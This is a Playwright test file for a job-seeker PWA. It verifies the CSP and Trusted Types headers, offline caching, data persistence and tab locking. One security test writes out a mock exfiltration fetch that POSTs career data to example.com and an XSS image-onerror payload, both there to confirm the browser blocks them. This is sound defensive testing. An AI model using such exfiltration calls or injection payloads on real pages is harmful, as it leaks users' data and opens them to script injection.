import { chromium, expect, test } from "@playwright/test";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { startPwaServer, type PwaServer } from "./support/server";
import { distPwa, healthcareProfile, waitForRuntime } from "./support/fixtures";

let server: PwaServer;

test.beforeAll(async () => {
  server = await startPwaServer(distPwa);
});

test.afterAll(async () => {
  await server.close();
});

test("first run boots the local-first runtime with production security and install metadata", async ({ page }) => {
  const violations: string[] = [];
  page.on("console", (message) => {
    if (/Content Security Policy|TrustedType|Refused to/i.test(message.text())) violations.push(message.text());
  });
  await page.goto(server.url);
  await waitForRuntime(page);
  await expect(page.getByText("Start with what you already have.")).toBeVisible();

  const info = await page.evaluate(() => window.electronAPI.getRuntimeInfo());
  expect(info.kind).toBe("web");
  expect(info.channel).toBe("web");
  expect(info.storage.engine).toBe("SQLite WASM");
  expect(info.capabilities.browserRenderedSources).toBe(false);

  const buildInfo = JSON.parse(await readFile(path.join(distPwa, "build-info.json"), "utf8"));
  expect(info.buildId).toBe(buildInfo.buildId);
  await expect(page.locator('meta[name="job-ranger-build"]')).toHaveAttribute("content", buildInfo.buildId);

  const manifest = await page.evaluate(async () => {
    const href = document.querySelector<HTMLLinkElement>('link[rel="manifest"]')!.href;
    return (await fetch(href)).json();
  });
  expect(manifest.name).toBe("Sojourner: Employment Toolkit");
  expect(manifest.display).toBe("standalone");
  expect(manifest.icons.map((icon: { sizes: string }) => icon.sizes)).toEqual(
    expect.arrayContaining(["192x192", "512x512"]),
  );

  const response = await page.request.get(server.url);
  const csp = response.headers()["content-security-policy"];
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("require-trusted-types-for 'script'");
  expect(response.headers()["x-frame-options"]).toBe("DENY");

  // The page cannot load arbitrary remote script or reach non-allowlisted origins.
  const blockedFetch = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "career data" });
      return "sent";
    } catch {
      return "blocked";
    }
  });
  expect(blockedFetch).toBe("blocked");
  const trustedTypesEnforced = await page.evaluate(() => {
    try {
      document.body.insertAdjacentHTML("beforeend", "<img src=x onerror=alert(1)>");
      return false;
    } catch {
      return true;
    }
  });
  expect(trustedTypesEnforced).toBe(true);
  expect(violations.filter((text) => !/example\.com|insertAdjacentHTML|TrustedHTML/.test(text))).toEqual([]);
});

test("service worker serves the verified shell offline without touching career data", async ({ page, context }) => {
  await page.goto(server.url);
  await waitForRuntime(page);
  await page.evaluate((profile) => window.electronAPI.career.saveProfile(profile), healthcareProfile);
  await page.evaluate(async () => {
    await navigator.serviceWorker.ready;
  });
  await page.reload();
  await waitForRuntime(page);
  expect(await page.evaluate(() => Boolean(navigator.serviceWorker.controller))).toBe(true);
  const cacheNames = await page.evaluate(() => caches.keys());
  expect(cacheNames.every((name) => name.startsWith("job-ranger-shell-"))).toBe(true);

  await context.setOffline(true);
  await page.reload();
  await waitForRuntime(page);
  const profile = await page.evaluate(() => window.electronAPI.career.getProfile());
  expect(profile?.fullName).toBe("Morgan Rivera");
  await expect(page.getByRole("link", { name: "Applications" }).first()).toBeVisible();
  await context.setOffline(false);
});

test("career data persists across reloads and full browser restarts", async () => {
  const profileDirectory = await mkdtemp(path.join(os.tmpdir(), "job-ranger-pwa-profile-"));
  const launch = () =>
    chromium.launchPersistentContext(profileDirectory, {
      executablePath: process.env.JOB_RANGER_PW_CHROMIUM || undefined,
    });
  try {
    let context = await launch();
    let page = await context.newPage();
    await page.goto(server.url);
    await waitForRuntime(page);
    await page.evaluate((profile) => window.electronAPI.career.saveProfile(profile), healthcareProfile);
    const evidence = await page.evaluate(() =>
      window.electronAPI.career.createUserEvidence({
        subjectType: "credential",
        organization: "American Heart Association",
        titleOrName: "CPR/BLS",
        startDate: "2026-01",
        endDate: null,
        statement: "Current CPR/BLS certification.",
        skills: [],
        methodsOrTools: [],
        scope: [],
        outcomes: [],
        metrics: [],
        credential: {
          issuer: "American Heart Association",
          jurisdiction: null,
          status: "active",
          expirationDate: "2028-01-31",
          credentialId: null,
        },
      }),
    );
    await page.reload();
    await waitForRuntime(page);
    expect((await page.evaluate(() => window.electronAPI.career.getProfile()))?.fullName).toBe("Morgan Rivera");
    await context.close();

    context = await launch();
    page = await context.newPage();
    await page.goto(server.url);
    await waitForRuntime(page);
    expect((await page.evaluate(() => window.electronAPI.career.getProfile()))?.fullName).toBe("Morgan Rivera");
    const items = await page.evaluate(() => window.electronAPI.career.listEvidence());
    const persisted = items.find((item) => item.evidence.id === evidence.id);
    expect(persisted?.evidence.verificationState).toBe("user-authored");
    expect(persisted?.evidence.credential?.expirationDate).toBe("2028-01-31");
    await context.close();
  } finally {
    await rm(profileDirectory, { recursive: true, force: true });
  }
});

test("only one tab can write the local workspace at a time", async ({ context }) => {
  const first = await context.newPage();
  await first.goto(server.url);
  await waitForRuntime(first);

  const second = await context.newPage();
  await second.goto(server.url);
  await expect(second.getByText("Sojourner is open in another tab or window")).toBeVisible();

  await first.close();
  await waitForRuntime(second);
  await expect(second.getByText("Sojourner is open in another tab or window")).toHaveCount(0);
  const info = await second.evaluate(() => window.electronAPI.getRuntimeInfo());
  expect(info.kind).toBe("web");
});
